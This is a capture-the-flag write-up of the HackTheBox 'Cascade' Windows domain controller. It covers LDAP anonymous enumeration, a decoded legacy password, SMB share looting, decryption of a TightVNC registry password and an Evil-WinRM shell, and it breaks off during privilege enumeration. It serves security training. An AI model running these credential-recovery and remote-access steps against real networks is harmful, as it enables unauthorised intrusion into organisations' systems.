---
render_with_liquid: false
title: HackTheBox Writeup  Cascade
date: 2024-02-06 12:01:22 +1400
tags: [hackthebox, nmap, windows, ad, ldap, ldap-anonymous-bind, netexec, ldapsearch, discover-secrets, ldapdomaindump, discover-notes, tight-vnc, vncpasswd, evil-winrm, enum, sqlite, reversing, dnspy, dotnet-framework, ad-recyclebin, oscp-like-2023]
---



Cascade is a medium difficulty Windows machine configured as a Domain Controller. LDAP anonymous binds are enabled, and enumeration yields the password for user `r.thompson`, which gives access to a `TightVNC` registry backup. The backup is decrypted to gain the password for `s.smith`. This user has access to a .NET executable, which after decompilation and source code analysis reveals the password for the `ArkSvc` account. This account belongs to the `AD Recycle Bin` group, and is able to view deleted Active Directory objects. One of the deleted user accounts is found to contain a hardcoded password, which can be reused to login as the primary domain administrator.


# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ pt init '10.129.45.164 cascade.local CASC-DC1.cascade.local CASC-DC1'
+---------+--------+---------------+------------------------+
| PROFILE | STATUS |      IP       |         DOMAIN         |
+---------+--------+---------------+------------------------+
| cascade | on     | 10.129.45.164 | cascade.local          |
| cascade | on     | 10.129.45.164 | CASC-DC1.cascade.local |
| cascade | on     | 10.129.45.164 | CASC-DC1               |
+---------+--------+---------------+------------------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Tue Feb  6 12:01:22 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49170, cascade.local
Nmap scan report for cascade.local (10.129.45.164)
Host is up, received user-set (0.096s latency).
Scanned at 2024-02-06 12:01:22 CST for 107s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-02-06 04:01:52Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49170/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-02-06T04:02:50
|_  start_date: 2024-02-06T03:46:41
|_clock-skew: 22s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 11912/tcp): CLEAN (Timeout)
|   Check 2 (port 61127/tcp): CLEAN (Timeout)
|   Check 3 (port 13496/udp): CLEAN (Timeout)
|   Check 4 (port 40083/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled and required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Tue Feb  6 12:03:09 2024 -- 1 IP address (1 host up) scanned in 106.54 seconds
```

## 53 - DNS


### DNS Reverse Lookup

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ dig -p 53 -x cascade.local @cascade.local

; <<>> DiG 9.19.19-1-Debian <<>> -p 53 -x cascade.local @cascade.local
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: FORMERR, id: 37039
;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: 261b45fe35f89243 (echoed)
;; QUESTION SECTION:
;local.cascade.in-addr.arpa.    IN      PTR

;; Query time: 96 msec
;; SERVER: 10.129.45.164#53(cascade.local) (UDP)
;; WHEN: Tue Feb 06 12:11:41 CST 2024
;; MSG SIZE  rcvd: 67
```

### DNS Zone Transfer

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ dig AXFR -p 53 @cascade.local cascade.local

; <<>> DiG 9.19.19-1-Debian <<>> AXFR -p 53 @cascade.local cascade.local
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

### DnsRecon Default Scan

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ dnsrecon -n cascade.local -d cascade.local 2>&1
[*] std: Performing General Enumeration against: cascade.local...
[-] DNSSEC is not configured for cascade.local
[*]      SOA casc-dc1.cascade.local 10.129.45.164
[*]      SOA casc-dc1.cascade.local dead:beef::fceb:3694:134b:72af
[*]      NS casc-dc1.cascade.local 10.129.45.164
[*]      Bind Version for 10.129.45.164 (1DB15D39)"
[*]      NS casc-dc1.cascade.local dead:beef::fceb:3694:134b:72af
[*]      Bind Version for dead:beef::fceb:3694:134b:72af (1DB15D39)"
[*]      A cascade.local 10.10.10.182
[*]      A cascade.local 10.10.10.183
[*]      AAAA cascade.local dead:beef::8a8:d14d:1d23:bbe2
[*] Enumerating SRV Records
[+]      SRV _kerberos._tcp.cascade.local casc-dc1.cascade.local 10.129.45.164 88
[+]      SRV _kerberos._tcp.cascade.local casc-dc1.cascade.local dead:beef::fceb:3694:134b:72af 88
[+]      SRV _gc._tcp.cascade.local casc-dc1.cascade.local 10.129.45.164 3268
[+]      SRV _gc._tcp.cascade.local casc-dc1.cascade.local dead:beef::fceb:3694:134b:72af 3268
[+]      SRV _kerberos._udp.cascade.local casc-dc1.cascade.local 10.129.45.164 88
[+]      SRV _kerberos._udp.cascade.local casc-dc1.cascade.local dead:beef::fceb:3694:134b:72af 88
[+]      SRV _ldap._tcp.cascade.local casc-dc1.cascade.local 10.129.45.164 389
[+]      SRV _ldap._tcp.cascade.local casc-dc1.cascade.local dead:beef::fceb:3694:134b:72af 389
[+]      SRV _ldap._tcp.gc._msdcs.cascade.local casc-dc1.cascade.local 10.129.45.164 3268
[+]      SRV _ldap._tcp.gc._msdcs.cascade.local casc-dc1.cascade.local dead:beef::fceb:3694:134b:72af 3268
[+]      SRV _ldap._tcp.dc._msdcs.cascade.local casc-dc1.cascade.local 10.129.45.164 389
[+]      SRV _ldap._tcp.dc._msdcs.cascade.local casc-dc1.cascade.local dead:beef::fceb:3694:134b:72af 389
[+]      SRV _kerberos._tcp.dc._msdcs.cascade.local casc-dc1.cascade.local 10.129.45.164 88
[+]      SRV _kerberos._tcp.dc._msdcs.cascade.local casc-dc1.cascade.local dead:beef::fceb:3694:134b:72af 88
[+]      SRV _ldap._tcp.pdc._msdcs.cascade.local casc-dc1.cascade.local 10.129.45.164 389
[+]      SRV _ldap._tcp.pdc._msdcs.cascade.local casc-dc1.cascade.local dead:beef::fceb:3694:134b:72af 389
[+]      SRV _kpasswd._udp.cascade.local casc-dc1.cascade.local 10.129.45.164 464
[+]      SRV _kpasswd._udp.cascade.local casc-dc1.cascade.local dead:beef::fceb:3694:134b:72af 464
[+]      SRV _kpasswd._tcp.cascade.local casc-dc1.cascade.local 10.129.45.164 464
[+]      SRV _kpasswd._tcp.cascade.local casc-dc1.cascade.local dead:beef::fceb:3694:134b:72af 464
[+]      SRV _ldap._tcp.ForestDNSZones.cascade.local casc-dc1.cascade.local 10.129.45.164 389
[+]      SRV _ldap._tcp.ForestDNSZones.cascade.local casc-dc1.cascade.local dead:beef::fceb:3694:134b:72af 389
[+] 22 Records Found
```

### Subdomain Enumeration

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ gobuster dns -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o gobuster_subdomains.txt -t 100 -d cascade.local -r cascade.local

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     cascade.local
[+] Threads:    100
[+] Resolver:   cascade.local
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: gc._msdcs.cascade.local

Found: domaindnszones.cascade.local

Found: forestdnszones.cascade.local

Progress: 114441 / 114442 (100.00%)
===============================================================
Finished
===============================================================
```

## 389 - LDAP


### Anonymous binding

Get naming context

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ ldapsearch -H "ldap://$(pt get rhost)" -x -s base namingcontexts

# extended LDIF

#

# LDAPv3

# base <> (default) with scope baseObject

# filter: (objectclass=*)

# requesting: namingcontexts

#


#
dn:
namingContexts: DC=cascade,DC=local
namingContexts: CN=Configuration,DC=cascade,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=cascade,DC=local
namingContexts: DC=DomainDnsZones,DC=cascade,DC=local
namingContexts: DC=ForestDnsZones,DC=cascade,DC=local


# search result
search: 2
result: 0 Success


# numResponses: 2

# numEntries: 1
```

Enumerate info in a base

```bash
ldapsearch -H "ldap://$(pt get rhost)" -x -b "DC=cascade,DC=local" | tee enum/ldap_all.txt
```

## 445 - SMB


### Auth

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ nxc smb $(pt get rhost) -u '' -p ''
SMB         10.129.45.164   445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.45.164   445    CASC-DC1         [+] cascade.local\:

┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ nxc smb $(pt get rhost) -u 'a' -p ''
SMB         10.129.45.164   445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.45.164   445    CASC-DC1         [-] cascade.local\a: STATUS_LOGON_FAILURE
```

### Shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ nxc smb $(pt get rhost) -u '' -p '' --shares
SMB         10.129.45.164   445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.45.164   445    CASC-DC1         [+] cascade.local\:
SMB         10.129.45.164   445    CASC-DC1         [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

### Users & Groups

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ nxc smb $(pt get rhost) -u '' -p '' --rid-brute
SMB         10.129.45.164   445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.45.164   445    CASC-DC1         [+] cascade.local\:
SMB         10.129.45.164   445    CASC-DC1         498: CASCADE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.45.164   445    CASC-DC1         500: CASCADE\administrator (SidTypeUser)
SMB         10.129.45.164   445    CASC-DC1         501: CASCADE\CascGuest (SidTypeUser)
SMB         10.129.45.164   445    CASC-DC1         502: CASCADE\krbtgt (SidTypeUser)
SMB         10.129.45.164   445    CASC-DC1         512: CASCADE\Domain Admins (SidTypeGroup)
SMB         10.129.45.164   445    CASC-DC1         513: CASCADE\Domain Users (SidTypeGroup)
SMB         10.129.45.164   445    CASC-DC1         514: CASCADE\Domain Guests (SidTypeGroup)
SMB         10.129.45.164   445    CASC-DC1         515: CASCADE\Domain Computers (SidTypeGroup)
SMB         10.129.45.164   445    CASC-DC1         516: CASCADE\Domain Controllers (SidTypeGroup)
SMB         10.129.45.164   445    CASC-DC1         517: CASCADE\Cert Publishers (SidTypeAlias)
SMB         10.129.45.164   445    CASC-DC1         518: CASCADE\Schema Admins (SidTypeGroup)
SMB         10.129.45.164   445    CASC-DC1         519: CASCADE\Enterprise Admins (SidTypeGroup)
SMB         10.129.45.164   445    CASC-DC1         520: CASCADE\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.45.164   445    CASC-DC1         521: CASCADE\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.45.164   445    CASC-DC1         553: CASCADE\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.45.164   445    CASC-DC1         571: CASCADE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.45.164   445    CASC-DC1         572: CASCADE\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.45.164   445    CASC-DC1         1001: CASCADE\CASC-DC1$ (SidTypeUser)
SMB         10.129.45.164   445    CASC-DC1         1102: CASCADE\DnsAdmins (SidTypeAlias)
SMB         10.129.45.164   445    CASC-DC1         1103: CASCADE\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.45.164   445    CASC-DC1         1106: CASCADE\arksvc (SidTypeUser)
SMB         10.129.45.164   445    CASC-DC1         1107: CASCADE\s.smith (SidTypeUser)
SMB         10.129.45.164   445    CASC-DC1         1109: CASCADE\r.thompson (SidTypeUser)
SMB         10.129.45.164   445    CASC-DC1         1111: CASCADE\util (SidTypeUser)
SMB         10.129.45.164   445    CASC-DC1         1113: CASCADE\IT (SidTypeAlias)
SMB         10.129.45.164   445    CASC-DC1         1114: CASCADE\Production (SidTypeAlias)
SMB         10.129.45.164   445    CASC-DC1         1115: CASCADE\HR (SidTypeAlias)
SMB         10.129.45.164   445    CASC-DC1         1116: CASCADE\j.wakefield (SidTypeUser)
SMB         10.129.45.164   445    CASC-DC1         1119: CASCADE\AD Recycle Bin (SidTypeAlias)
SMB         10.129.45.164   445    CASC-DC1         1120: CASCADE\Backup (SidTypeAlias)
SMB         10.129.45.164   445    CASC-DC1         1121: CASCADE\s.hickson (SidTypeUser)
SMB         10.129.45.164   445    CASC-DC1         1122: CASCADE\j.goodhand (SidTypeUser)
SMB         10.129.45.164   445    CASC-DC1         1123: CASCADE\Temps (SidTypeAlias)
SMB         10.129.45.164   445    CASC-DC1         1124: CASCADE\a.turnbull (SidTypeUser)
SMB         10.129.45.164   445    CASC-DC1         1125: CASCADE\WinRMRemoteWMIUsers__ (SidTypeAlias)
SMB         10.129.45.164   445    CASC-DC1         1126: CASCADE\Remote Management Users (SidTypeAlias)
SMB         10.129.45.164   445    CASC-DC1         1127: CASCADE\e.crowe (SidTypeUser)
SMB         10.129.45.164   445    CASC-DC1         1128: CASCADE\b.hanson (SidTypeUser)
SMB         10.129.45.164   445    CASC-DC1         1129: CASCADE\d.burman (SidTypeUser)
SMB         10.129.45.164   445    CASC-DC1         1130: CASCADE\BackupSvc (SidTypeUser)
SMB         10.129.45.164   445    CASC-DC1         1132: CASCADE\Factory (SidTypeAlias)
SMB         10.129.45.164   445    CASC-DC1         1133: CASCADE\Finance (SidTypeAlias)
SMB         10.129.45.164   445    CASC-DC1         1134: CASCADE\j.allen (SidTypeUser)
SMB         10.129.45.164   445    CASC-DC1         1135: CASCADE\i.croft (SidTypeUser)
SMB         10.129.45.164   445    CASC-DC1         1137: CASCADE\Audit Share (SidTypeAlias)
SMB         10.129.45.164   445    CASC-DC1         1138: CASCADE\Data Share (SidTypeAlias)
```

# User Flag
---

## Asreproasting attempt

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ cat enum/nxc_rid_brute.txt | grep SidTypeUser | awk '{print $6}' | awk -F'\' '{print $2}' | tee ad_users.lst
administrator
CascGuest
krbtgt
CASC-DC1$
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft

┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ GetNPUsers.py cascade.local/ -request -usersfile ad_users.lst -format hashcat
Impacket v0.12.0.dev1+20240130.154745.97007e8 - Copyright 2023 Fortra

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User CASC-DC1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User arksvc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User s.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User r.thompson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User util doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.wakefield doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User s.hickson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.goodhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a.turnbull doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User d.burman doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User BackupSvc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j.allen doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```

## Auth as r.thompson


### Password in LDAP data

Dump `user` data

```bash
ldapsearch -H "ldap://$(pt get rhost)" -x -b "DC=cascade,DC=local" '(objectClass=user)' | tee enum/ldap_users.txt
```

Filter out uninteresting data, makes `ServicePrincipalName` (Kerberoasting),  custom info fields, and users that have logged on more obvious

```bash
cat enum/ldap_users.txt | grep -vE '^dSCorePropagationData:|^objectCategory:|^userPrincipalName:|^sAMAccountType:|^logonCount:|^accountExpires:|^objectSid:|^primaryGroupID:|^pwdLastSet:|^lastLogon:|^lastLogoff:|^badPasswordTime:|^userAccountControl:|^objectGUID:|^name:|^uSNChanged:|^countryCode:|^codePage:|^badPwdCount:|^uSNCreated|^whenChanged:|^whenCreated:|^instanceType:|^distinguishedName:|^sn:|^cn:|^dn:|^objectClass:|^givenName:|^memberOf:|^displayName:|^sAMAccountName:|^scriptPath:'
```

^577dad

Got 4 users that have logged in before, and an additional field `cascadeLegacyPwd` for user `Ryan Thompson`

```bash
[...]

# ArkSvc, Services, Users, UK, cascade.local
lastLogonTimestamp: 132294371134322815


# Steve Smith, Users, UK, cascade.local
lastLogonTimestamp: 132294366735115088


# Ryan Thompson, Users, UK, cascade.local
lastLogonTimestamp: 132294360317419816
cascadeLegacyPwd: clk0bjVldmE=


# Util, Services, Users, UK, cascade.local
lastLogonTimestamp: 132247085871071226
[...]
```

The password after base64 decode is valid

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ echo 'clk0bjVldmE=' | base64 -d
rY4n5eva 
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ cat enum/ldap_users.txt | grep 'Ryan Thompson' -E15 | grep -i samaccount
sAMAccountName: s.smith
sAMAccountType: 805306368
sAMAccountName: r.thompson
sAMAccountType: 805306368

┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ nxc smb cascade.local -u 'r.thompson' -p 'rY4n5eva'
SMB         10.129.45.164   445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.45.164   445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva
```


## Shell as s.smith


### Ldapdomaindump

```bash
ldapdomaindump -o ldapdomaindump -r cascade.local -u 'cascade.local\r.thompson' -p 'rY4n5eva'
```

- `Windows Server 2008 R2 Standard`

![](/assets/obsidian/05aafc5cb8891045de566fd732348b89.png)

- 3 interesting users

![](/assets/obsidian/0102036a77267f8bfe9589a90ba582ef.png)

No juicy info in users data

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ cat ldapdomaindump/domain_users.json | jq '.[].attributes | ((.sAMAccountName | join(",")) + ":" + (.description, .info | select (.!=null) | join(",")))'
"krbtgt:Key Distribution Center Service Account"
"CascGuest:Built-in account for guest access to the computer/domain"
"administrator:Built-in account for administering the computer/domain"
```


### SMB Shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ nxc smb cascade.local -u 'r.thompson' -p 'rY4n5eva' --shares
SMB         10.129.45.164   445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.45.164   445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva
SMB         10.129.45.164   445    CASC-DC1         [*] Enumerated shares
SMB         10.129.45.164   445    CASC-DC1         Share           Permissions     Remark
SMB         10.129.45.164   445    CASC-DC1         -----           -----------     ------
SMB         10.129.45.164   445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.129.45.164   445    CASC-DC1         Audit$
SMB         10.129.45.164   445    CASC-DC1         C$                              Default share
SMB         10.129.45.164   445    CASC-DC1         Data            READ
SMB         10.129.45.164   445    CASC-DC1         IPC$                            Remote IPC
SMB         10.129.45.164   445    CASC-DC1         NETLOGON        READ            Logon server share
SMB         10.129.45.164   445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.129.45.164   445    CASC-DC1         SYSVOL          READ            Logon server share
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ folders=(Data); for f in $folders; do mkdir -p loot/smb/$f && smbclient "//cascade.local/$f" -U 'r.thompson%rY4n5eva' -c "lcd loot/smb/$f; mask \"\"; recurse ON; prompt OFF; mget *"; done
NT_STATUS_ACCESS_DENIED listing \Contractors\*
NT_STATUS_ACCESS_DENIED listing \Finance\*
NT_STATUS_ACCESS_DENIED listing \Production\*
NT_STATUS_ACCESS_DENIED listing \Temps\*
getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as IT/Email Archives/Meeting_Notes_June_2018.html (6.5 KiloBytes/sec) (average 6.5 KiloBytes/sec)
getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log (3.4 KiloBytes/sec) (average 4.9 KiloBytes/sec)
getting file \IT\Logs\DCs\dcdiag.log of size 5967 as IT/Logs/DCs/dcdiag.log (15.4 KiloBytes/sec) (average 8.4 KiloBytes/sec)
getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as IT/Temp/s.smith/VNC Install.reg (6.9 KiloBytes/sec) (average 8.0 KiloBytes/sec)
```

`Meeting_Notes_June_2018` email reveals that a temporary admin account was created, and it share the same password with normal admin account

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ cat loot/smb/Data/IT/Email\ Archives/Meeting_Notes_June_2018.html|h2t
From:                                        Steve Smith
To:                                              IT (Internal)
Sent:                                          14 June 2018 14:07
Subject:                                    Meeting Notes
 
For anyone that missed yesterdays meeting (Im looking at you Ben). Main
points are below:
 
-- New production network will be going live on Wednesday so keep an eye out
for any issues.
-- We will be using a temporary account to perform all tasks related to the
network migration and this account will be deleted at the end of 2018 once the
migration is complete. This will allow us to identify actions related to the
migration in security logs etc. Username is TempAdmin (password is the same as
the normal admin account password).
-- The winner of the Best GPO competition will be announced on Friday so get
your submissions in soon.
 
Steve
```

`ArkAdRecycleBin.log` shows that `TempAdmin` was moved to recyclebin

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ cat loot/smb/Data/IT/Logs/Ark\ AD\ Recycle\ Bin/ArkAdRecycleBin.log
1/10/2018 15:43 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
1/10/2018 15:43 [MAIN_THREAD]   Validating settings...
1/10/2018 15:43 [MAIN_THREAD]   Error: Access is denied
1/10/2018 15:43 [MAIN_THREAD]   Exiting with error code 5
2/10/2018 15:56 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
2/10/2018 15:56 [MAIN_THREAD]   Validating settings...
2/10/2018 15:56 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
2/10/2018 15:56 [MAIN_THREAD]   Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD]   Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
2/10/2018 15:56 [MAIN_THREAD]   Exiting with error code 0
8/12/2018 12:22 [MAIN_THREAD]   ** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
8/12/2018 12:22 [MAIN_THREAD]   Validating settings...
8/12/2018 12:22 [MAIN_THREAD]   Running as user CASCADE\ArkSvc
8/12/2018 12:22 [MAIN_THREAD]   Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
8/12/2018 12:22 [MAIN_THREAD]   Exiting with error code 0
```

`dcdiag.log` was a diagnosis log that doesn't help much

`VNC Install.reg` stores a **TightVNC** password for `s.smith`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ cat loot/smb/Data/IT/Temp/s.smith/VNC\ Install.reg
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
[...]
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
[...]
```

### Decrypt TightVNC password

Google : `tightvnc HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server decrypt password`

> https://stackoverflow.com/questions/43768987/can-i-set-password-for-tightvnc-through-powershell

```bash
git clone https://github.com/trinitronx/vncpasswd.py.git vncpasswd.py
cd vncpasswd.py
```

```bash
┌──(bravosec㉿fsociety)-[/opt/sectools/password-attacks/decrypt/vncpasswd.py]
└─$ python2 ./vncpasswd.py -d -H 6bcf2a4b6e5aca0f
Decrypted Bin Pass= 'sT333ve2'
Decrypted Hex Pass= '7354333333766532'
```

Password is valid

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ nxc smb cascade.local -u 's.smith' -p 'sT333ve2'
SMB         10.129.45.164   445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.45.164   445    CASC-DC1         [+] cascade.local\s.smith:sT333ve2
```

### Evil-winrm

From `ldapdomaindump`, we know `s.smith` is in `Remote Management Users` group

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cascade]
└─$ evil-winrm -i cascade.local -u 's.smith' -p 'sT333ve2'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\s.smith\Documents> whoami
cascade\s.smith
*Evil-WinRM* PS C:\Users\s.smith\Documents> cat ..\Desktop\user.txt
9ebac438b5aaeaf554f8d4b17fc7d32f
```

# Root Flag
---

## Auth as c4scadek3y654321


### Enumeration

```bash
*Evil-WinRM* PS C:\Users\s.smith\Documents> whoami /all

USER INFORMATION
----------------

User Name       SID
=============== ==============================================
cascade\s.smith S-1-5-21-3332504370-1206983947-1165150453-1107


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ===============================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Audit Share                         Alias            S-1-5-21-3332504370-1206983947-1165150453-1137 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
